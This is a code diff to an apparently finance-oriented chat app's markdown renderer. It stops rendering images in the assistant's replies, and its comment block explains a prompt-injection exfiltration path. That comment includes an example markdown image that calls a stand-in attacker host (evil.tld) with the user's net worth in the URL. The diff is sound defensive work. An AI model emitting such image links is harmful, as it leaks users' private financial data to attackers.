@@ -17,10 +17,34 @@ import { Streamdown } from "streamdown";
 function AssistantMarkdown({ children }: { children: string }) {
   return (
     <div className="assistantMarkdown">
-      <Streamdown controls={false}>{children}</Streamdown>
+      <Streamdown components={ASSISTANT_MARKDOWN_COMPONENTS} controls={false}>
+        {children}
+      </Streamdown>
     </div>
   );
 }
+
+/**
+ * The assistant renders NO images, ever (#1246 security review).
+ *
+ * A remote `<img src>` is an outbound GET the browser makes with no click, so a
+ * markdown image in the reply is a data-egress channel: a successful prompt
+ * injection — from an attachment the user was sent and forwarded, from a
+ * spreadsheet grid (#865), from any untrusted text a tool returns — can end its
+ * answer with `![](https://evil.tld/p.png?d=<net worth>)` and the pixels leave the
+ * page on their own. streamdown's default `allowedImagePrefixes` is `["*"]`, and
+ * the deployed CSP is served in report-only mode, so nothing downstream stops it.
+ *
+ * Dropping the element is the whole fix, and it costs nothing real: the assistant
+ * answers in prose, figures and links to worthline's own surfaces — it has never
+ * had a reason to paint an image. This is a narrow, verifiable rule, not a
+ * sanitizer to keep correct: there is no allowlist to get wrong. Prose and links
+ * are untouched (`rehype-sanitize` already keeps `javascript:` out of hrefs), and
+ * the alt text still reads, so an injected image cannot even hide its own body.
+ */
+const ASSISTANT_MARKDOWN_COMPONENTS = {
+  img: ({ alt }: { alt?: string | undefined }) => <>{alt ?? ""}</>,
+} as const;
 
 /**
  * One text part of a chat turn. The assistant's prose is rendered as markdown;
